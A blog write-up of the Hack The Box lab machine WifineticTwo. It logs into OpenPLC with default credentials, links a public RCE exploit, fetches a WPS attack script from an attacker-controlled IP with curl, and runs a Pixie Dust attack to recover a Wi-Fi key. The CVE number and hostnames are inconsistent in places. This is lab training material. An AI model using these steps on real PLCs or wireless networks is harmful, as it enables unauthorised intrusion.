---
layout: default
title : brenda - headless HTB Writeup
---


![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(180).png)

`WifineticTwo` is a medium machine in HTB.

### Recon
### Nmap scan

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20().png)

Added target ip to /etc/hosts using these commands:

`echo "10.10.11.7 wifinetictwo.htb" | sudo tee -a /etc/hosts`

I then opened the website `wifinetictwo.hb:8080/`. And got this!

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(151).png)

I searched online for the default credentials for OpenPLC and used them to log in.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(162).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(154).png)

The OpenPLC webserver runs PLC programs from the OpenPLC editor and allows configuration of runtime parameters. Currently, the dashboard shows the loaded file is blank_program.st and the server is stopped.

### CVE-2021-31360

If you search for OpenPLC vulnerabilities, you'll find [CVE-2021-31630](https://www.cvedetails.com/cve/CVE-2021-31630) and this proof of concept: [exploit-db.com/exploits/49803](https://www.exploit-db.com/exploits/49803).

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(152).png)


### User Flag

The POC enables RCE against the host using user credentials. Before running it, update the compile_program file name in the POC to blank_program.st, matching the currently loaded file on the host OpenPLC.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(155).png)

Start a listener and execute the exploit.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(156).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(157).png)

And that's how I obtained the user flag!

### Privilege Escalation
### Root Flag

With root access on this machine, we're unable to access the root.txt flag, indicating the necessity to pivot to another system. To facilitate this, we'll tweak configurations here. 
Given the machine's name, it likely relates to wireless network settings. 
Let's enumerate network interfaces.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(159).png)

Inspect the configuration of the wireless network interface wlan0.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(160).png)

Initiate a scan for available WiFi networks.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(161).png)

We've spotted a WiFi network named `plcrouter` nearby, featuring enabled WPS mode with a BSSID of `02:00:00:00:01:00`.

Since WPS is active, we'll attempt a OneShot attack using a Python script available [here](https://github.com/kimocoder/OneShot). This attack, detailed in the provided tutorials: [here](https://en.kali.tools/?p=1002) and more [here](https://miloserdov.org/?p=3393), specifically targets Pixie Dust vulnerabilities.

First, clone the oneshot.py file to your machine. Then, start a server on your machine using the command

`python3 -m http.server 8080`

in the directory containing the oneshot.py file. Next, on the target machine, use the command 

`curl 10.10.14.30/oneshot.py > oneshot.py`

to download the file from your machine to the target machine.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(165).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(166).png)


Utilize the oneshot.py script to initiate a Pixie Dust attack, following the tutorials outlined in the provided links.
Run the command:

`python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K`

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(167).png)

The script retrieves the WPA-PSK key. Connect to the WiFi from the command line as instructed in the provided links.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(168).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(172).png)

Even though we've successfully associated with the WiFi AP, we haven't received an IP address from DHCP. Assign yourself an IP address within a typical private class C network, using a subnet mask of 255.255.255.0.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(171).png)

Search for instructions on connecting to WiFi using systemd and wpa_supplicant, and also obtaining a gateway using the provided link: [Connecting to WiFi network using systemd and wpa_supplicant](https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant).

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(175).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(176).png)


























































